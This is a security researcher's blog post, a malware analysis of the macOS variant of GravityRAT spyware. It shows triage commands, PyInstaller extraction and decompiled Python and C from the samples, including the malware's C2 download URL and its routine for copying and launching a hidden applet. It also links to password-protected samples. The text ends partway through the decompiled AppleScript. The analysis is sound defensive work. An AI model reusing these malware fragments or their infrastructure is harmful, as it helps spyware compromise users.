<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x5B/blockblock.png />
<meta name="twitter:title" content=Adventures&#32;in&#32;Anti-Gravity />
<meta name="twitter:description" content=Deconstructing&#32;the&#32;Mac&#32;Variant&#32;of&#32;GravityRAT />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=Adventures&#32;in&#32;Anti-Gravity />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x5B/blockblock.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">Adventures in Anti-Gravity</div>
  <div class="blogSubTitle">Deconstructing the Mac Variant of GravityRAT</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / November 3, 2020</div>
  <br>
<div style="border: 1px solid #DCDCDC; border-radius:7px; padding: 10px; margin-top:15px; margin-bottom: 15px">
    <center>Love these blog posts and/or want to support my research and tools? You can support them via my <a href="https://www.patreon.com/bePatron?c=701171" class="inlineLink">Patreon</a> page!
    <br><br>
    <a href="https://www.patreon.com/bePatron?c=701171" style="text-decoration: none;">
      <img src="../images/patreon.png" style="display:block;margin:auto; padding-top:0px; width:100%"/>
    </a>
    </center>
</div>
<br>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>I&rsquo;ve added the <a href="https://objective-see.com/downloads/malware/GravityRAT.zip">samples</a> (GravityRat) to our malware collection (password: infect3d)</p>
<p>&hellip;please don’t infect yourself!</p>
</div>
<h3 id="background">Background</h3>
<p>Recently, noted security researcher <a href="https://twitter.com/sh1shk0va?lang=en">Tatyana Shishkova</a> of Kaspersky published a new <a href="https://securelist.com/gravityrat-the-spy-returns/99097/">report</a> on the intriguing cross-platform spyware, <code>GravityRAT</code> (&quot;<em>used to target the Indian armed forces</em>&quot;). In this report, she noted that for the first time, &ldquo;<em>there are now versions for &hellip;macOS</em>&rdquo;.</p>
<p>In this blog post, we&rsquo;ll build upon her work, diving deeper into the macOS versions of this malware.</p>
<div class="note">
<p>Tatyana&rsquo;s writeup is great place to start, and provides a lot of great foundational detail and insights about GravityRAT &hellip;including the newly uncovered macOS variants.</p>
<p>As such, it is a must read:</p>
<center>
"<a href="https://securelist.com/gravityrat-the-spy-returns/99097/" class="inlineLink">GravityRAT: The spy returns</a>"
</center>
</div>
<h3 id="samples">Samples</h3>
<p>Kasperksy was kind enough to share various samples of <code>GravityRAT</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ shasum OSX.GravityRAT/*
086b22075d464b327a2bcbf8b66736560a215347  ~/OSX.GravityRAT/Enigma
696c7cbba2c9326298f3ddca5f22cfb20a4cd3ee  ~/OSX.GravityRAT/OrangeVault
e33894042f3798516967471d0ce1e92d10dec756  ~/OSX.GravityRAT/StrongBox
9b5b234e3b53f254bc9b3717232d1030e340c7f2  ~/OSX.GravityRAT/TeraSpace
</pre>
</div>
<p>Using macOS&rsquo;s built-in <code>file</code> command, we can ascertain that these samples are all executable (64bit) Mach-O binaries:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file OSX.GravityRAT/*
OSX.GravityRAT/Enigma:          Mach-O 64-bit executable x86_64
OSX.GravityRAT/OrangeVault:     Mach-O 64-bit executable x86_64
OSX.GravityRAT/StrongBox:       Mach-O 64-bit executable x86_64
OSX.GravityRAT/TeraSpace:       Mach-O 64-bit executable x86_64
</pre>
</div>
<p>&hellip;though are all unsigned:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ for i in OSX.GravityRAT/*; do codesign -dvvv $i; done
OSX.GravityRAT/Enigma: code object is not signed at all
OSX.GravityRAT/OrangeVault: code object is not signed at all
OSX.GravityRAT/StrongBox: code object is not signed at all
OSX.GravityRAT/TeraSpace: code object is not signed at all
</pre>
</div>
<p>A brief triage revealed that while the <code>Enigma</code> file appeared unique, the other three (<code>OrangeVault</code>, <code>StrongBox</code>, and <code>TeraSpace</code>) appeared quite similar. As such, we&rsquo;ll first dive into the <code>Enigma</code> binary. Following this, we&rsquo;ll also analyze one of the files from the other group.</p>
<h3 id="enigma">Enigma</h3>
<p>The Enigma file (<code>sha1: 086b22075d464b327a2bcbf8b66736560a215347</code>) is an unsigned 64bit Mach-O binary.</p>
<p>Kaspersky&rsquo;s <a href="https://securelist.com/gravityrat-the-spy-returns/99097/">report</a> notes that the Windows version was &ldquo;<em>downloaded from the site enigma.net[.]in under the guise of a secure file sharing app to protect against ransomware</em>&rdquo;. The macOS version also appears to masquerade as such an application:</p>
<img src="../images/blog/blog_0x5B/enigma.png"  width="80%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">The Enigma UI</center>

<p>Kaspersky states that the Window&rsquo;s versions of the malware are, &ldquo;<em>written in Python and packaged using &hellip;<code>PyInstaller</code></em>&rdquo;.</p>
<div class="note">
<p>Leveraging a tool such as PyInstaller allows developers (or malware authors) to write cross-platform python code, then generate native, platform-specific binaries:</p>
<p>&ldquo;<i>PyInstaller freezes (packages) Python applications into stand-alone executables, under Windows, GNU/Linux, Mac OS X, FreeBSD, Solaris and AIX.</i>&rdquo;</p>
<p>To learn more about PyInstaller, head over to:</p>
<center>
  <a href="https://www.pyinstaller.org/" class="inlineLink">PyInstaller.org</a>.
</center>
</div>
<p>By extracting embedded strings, it&rsquo;s trivial to confirm that this macOS variant was (also) packaged up with <code>PyInstaller</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ strings - OSX.GravityRAT/Enigma | grep Python
Py_SetPythonHome
Error loading Python lib '%s': dlopen: %s
Error detected starting Python VM.
Python
</pre>
</div>
<p>This can also be confirmed via disassembly, by noting the the malware&rsquo;s <code>main</code> function simply calls into <code>PyInstaller</code>&rsquo;s <code>pyi_main</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    pyi_main(rdi, rsi, rdx, rcx, r8, r9);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>}</span></span></code></pre></div>
<p>Recognizing that the malware was packaged up with <code>PyInstaller</code> is important, as it means we can extract compiled python code, that ultimately we can fully decompile. Reading python code is of course far simpler than reading decompiled (dis)assembly!</p>
<p>One easy was to extract the compiled python code is via the <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a>. This open-source tool, can &ldquo;<em>extract the contents of a PyInstaller generated&hellip;executable file</em>&rdquo;</p>
<p>Once installed, we can extract the python archive:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ python pyinstxtractor.py Enigma 
[+] Processing Enigma
[+] Pyinstaller version: 2.1+
[+] Python version: 27
[+] Length of package: 17113011 bytes
[+] Found 458 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_pkgres.pyc
[+] Possible entry point: pyi_rth__tkinter.pyc
[+] Possible entry point: Enigma.pyc
[+] Found 828 files in PYZ archive
[+] Successfully extracted pyinstaller archive: Enigma

You can now use a python decompiler on the pyc files within the extracted directory
</pre>
</div>
<p>Let&rsquo;s take a peek at the file extracted by <code>pyinstxtractor</code> (which were placed in a directory named <code>Enigma_extracted</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ ls -1 Enigma_extracted/
Contents
Crypto
Enigma.pyc
MacOS.so
Nav.so
PIL._imaging.so
PIL._imagingtk.so
PIL._webp.so
PYZ-00.pyz
PYZ-00.pyz_extracted
Python
Tcl
Tk
_AE.so
_Ctl.so
_Dlg.so
_Evt.so
...
</pre>
</div>
<p>Most notable is the <code>Enigma.pyc</code> file, which as expected (due to its <code>.pyc</code> file extension), is compiled python byte code:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file OSX.GravityRAT/Enigma_extracted/Enigma.pyc 
OSX.GravityRAT/Enigma_extracted/Enigma.pyc: python 2.7 byte-compiled
</pre>
</div>
<p>We can readily decompile this bytecode via a site such as <a href="http://www.decompiler.com/">decompiler.com</a>:</p>
<img src="../images/blog/blog_0x5B/decompile.png"  width="90%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">decompiling...</center>

<p>&hellip;which gives us back python code!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e"># uncompyle6 version 3.6.4</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#75715e"># Python bytecode 2.7 (62211)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#75715e"># Decompiled from: Python 2.7.17 (default, Sep 30 2020, 13:38:04) </span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#75715e"># Embedded file name: Enigma.py</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#f92672">import</span> Tkinter <span style="color:#66d9ef">as</span> tk<span style="color:#f92672">,</span> ttk<span style="color:#f92672">,</span> tkFont <span style="color:#66d9ef">as</span> tkfont<span style="color:#f92672">,</span> tkFileDialog<span style="color:#f92672">,</span> uuid <span style="color:#66d9ef">as</span> libuuid<span style="color:#f92672">,</span> tkMessageBox<span style="color:#f92672">,</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span> re<span style="color:#f92672">,</span> base64<span style="color:#f92672">,</span> ctypes<span style="color:#f92672">,</span> datetime<span style="color:#f92672">,</span> glob<span style="color:#f92672">,</span> hashlib<span style="color:#f92672">,</span> json<span style="color:#f92672">,</span> os<span style="color:#f92672">,</span> platform<span style="color:#f92672">,</span> sys<span style="color:#f92672">,</span> threading<span style="color:#f92672">,</span> socket
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> ImageTk
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#f92672">import</span> traceback<span style="color:#f92672">,</span> subprocess<span style="color:#f92672">,</span> random<span style="color:#f92672">,</span> zlib<span style="color:#f92672">,</span> sqlite3<span style="color:#f92672">,</span> requests<span style="color:#f92672">,</span> time
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES, PKCS1_OAEP
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#f92672">from</span> Crypto <span style="color:#f92672">import</span> Random
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#f92672">from</span> Crypto.Hash <span style="color:#f92672">import</span> SHA256
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#f92672">from</span> Crypto.PublicKey <span style="color:#f92672">import</span> RSA
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#f92672">from</span> Crypto.Random <span style="color:#f92672">import</span> get_random_bytes
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>SSN <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>SSN<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>update({<span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;M_22CE2F63F5FF02F6B9754242E4BEE237&#39;</span>})
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>THREADS <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>dURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://download.enigma.net.in/90954349.php&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span><span style="color:#f92672">...</span></span></span></code></pre></div>
<p>The Kaspersky <a href="https://securelist.com/gravityrat-the-spy-returns/99097/">report</a> notes that the <code>GravityRAT</code> malware, &ldquo;<em>collects information about the computer, downloads the payload from the server, and adds a scheduled task.&rdquo;</em></p>
<p>Let&rsquo;s take a closer look at the decompiled python source code (from <code>Enigma.pyc</code>), to see how the malware performs each of these steps.</p>
<p>In the code&rsquo;s <code>main</code> function, it first invokes the following: <code>AUTH = IsAuth()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">IsAuth</span>():
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    <span style="color:#66d9ef">if</span> platform<span style="color:#f92672">.</span>system() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Darwin&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>        user <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getuid()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>        <span style="color:#66d9ef">if</span> user <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>            <span style="color:#66d9ef">with</span> open(os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#39;TMPDIR&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;tmp0.txt&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> (fb):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>                fb<span style="color:#f92672">.</span>write(sys<span style="color:#f92672">.</span>executable)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>            <span style="color:#66d9ef">if</span> hasattr(sys, <span style="color:#e6db74">&#39;_MEIPASS&#39;</span>):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>                os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;mkdir &#39;</span> <span style="color:#f92672">+</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(sys<span style="color:#f92672">.</span>_MEIPASS, <span style="color:#e6db74">&#39;Enigma.app&#39;</span>))
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>                os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;cp -R &#39;</span> <span style="color:#f92672">+</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(sys<span style="color:#f92672">.</span>_MEIPASS, <span style="color:#e6db74">&#39;Contents&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>                           <span style="color:#f92672">+</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(sys<span style="color:#f92672">.</span>_MEIPASS, <span style="color:#e6db74">&#39;Enigma.app/&#39;</span>))
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>                os<span style="color:#f92672">.</span>system(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(sys<span style="color:#f92672">.</span>_MEIPASS, <span style="color:#e6db74">&#39;Enigma.app/Contents/MacOS/applet&#39;</span>))
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>        <span style="color:#66d9ef">return</span> user
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>    AUTH <span style="color:#f92672">=</span> IsAuth()</span></span></code></pre></div>
<p>The <code>IsAuth</code> function first checks for macOS (<code>Darwin</code>), and then executes a block of logic if the user is <em>not</em> running with root privileges (<code>if user != 0</code>).</p>
<p>Specifically it:</p>
<ul>
<li>writes the path of the executable into a temporary file named <code>tmp0.txt</code></li>
<li>makes a directory named <code>Enigma.app</code> (via <code>mkdir</code>)</li>
<li>copies the <code>Contents</code> directory to <code>Enigma.app</code> (via <code>cp -R</code>)</li>
<li>executes the <code>Enigma.app/Contents/MacOS/applet</code></li>
</ul>
<p>This can be observed via our <a href="https://objective-see.com/products/utilities.html#ProcessMonitor">Process Monitor</a>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
<div style="font-size: 13px;">
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty

{
  "event": "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process": {
    "pid": 1384,
    "path": "/bin/mkdir",
    "uid": 501,
    "arguments": ["mkdir", "/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/_MEIcYXy95/Enigma.app"],
    ...
  }
}

{
  "event": "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process": {
    "pid": 1385,
    "path": "/bin/cp",
    "uid": 501,
    "arguments": ["cp", "-R", "/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/_MEIcYXy95/Contents", 
                              "/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/_MEIcYXy95/Enigma.app/"],
    ...
  }
}

{
  "event": "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process": {
    "pid": 1386,
    "path": "/private/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/_MEIcYXy95/Enigma.app/Contents/MacOS/applet",
    "uid": 501,
    "arguments": ["/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/_MEIcYXy95/Enigma.app/Contents/MacOS/applet"],
    ...
  }
} 
</div></pre>
</div>
<p>The <code>applet</code> binary is a fat (32bit &amp; 64bit) Mach-O binary:
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file Contents/MacOS/applet 
Contents/MacOS/applet: Mach-O universal binary with 2 architectures: 
  [i386:Mach-O executable i386]
  [x86_64:Mach-O 64-bit executable x86_64] 
</pre>
</div></p>
<p>It&rsquo;s a tiny binary that simply invokes <code>OpenDefaultComponent</code> then a function (<code>sub_100000f58</code>) that invokes <code>CallComponentDispatch</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">EntryPoint</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    rax <span style="color:#f92672">=</span> OpenDefaultComponent(<span style="color:#960050;background-color:#1e0010">&#39;</span>tlpa<span style="color:#960050;background-color:#1e0010">&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span>tpcs<span style="color:#960050;background-color:#1e0010">&#39;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>            sub_100000f58(rax);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>}</span></span></code></pre></div>
<p>Since <code>OpenDefaultComponent</code> is invoked with <code>apltscpt</code> it seems to be related to (perhaps) executing an AppleScript found in the application bundle, specifically <code>Contents/Resources/Scripts/main.scpt</code>.</p>
<p>The <code>main.scpt</code> file, is compiled AppleScript:
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file Contents/Resources/Scripts/main.scpt 
Contents/Resources/Scripts/main.scpt: AppleScript compiled
</pre>
</div></p>
<p>Luckily it&rsquo;s was not compiled in &ldquo;run-only&rdquo; mode, meaning we can trivially decompile with macOS&rsquo;s <code>Script Editor</code> application:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-AppleScript" data-lang="AppleScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">set</span> dirPath <span style="color:#66d9ef">to</span> system attribute <span style="color:#e6db74">&#34;TMPDIR&#34;</span>
